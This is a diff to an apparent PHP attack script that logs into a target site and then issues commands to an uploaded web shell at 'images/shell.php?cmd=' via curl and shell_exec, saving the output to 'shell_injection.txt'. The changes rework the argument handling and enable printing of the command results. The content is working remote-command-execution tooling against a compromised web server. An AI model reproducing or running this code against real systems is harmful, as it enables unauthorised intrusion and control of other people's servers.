@@ -30,9 +30,6 @@ define('USERNAME', $username);
 //The password of the account.
 define('PASSWORD', $password);
 
-//Upload file
-$shellPath = $argv[3];
-
 //An associative array that represents the required form fields.
 //You will need to change the keys / index names to match the name of the form
 //fields.
@@ -91,7 +88,7 @@ if(curl_errno($curl)){
 
 
 $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
-$shellcmd = $argv[4];
+$shellcmd = $argv[3];
 echo $cmd.$shellcmd; 
 $result = shell_exec ($cmd.$shellcmd);
 $result_txt = "-------------------------------------------------------------\n".
@@ -99,7 +96,7 @@ $result_txt = "-------------------------------------------------------------\n".
 			"Result:\n".
 			"----------------\n".
 			$result;
-// echo $result_txt;
+echo $result_txt;
 
 $resultfile = fopen("shell_injection.txt", "w") or die("Unable to open file!");
 fwrite($resultfile, $result_txt);
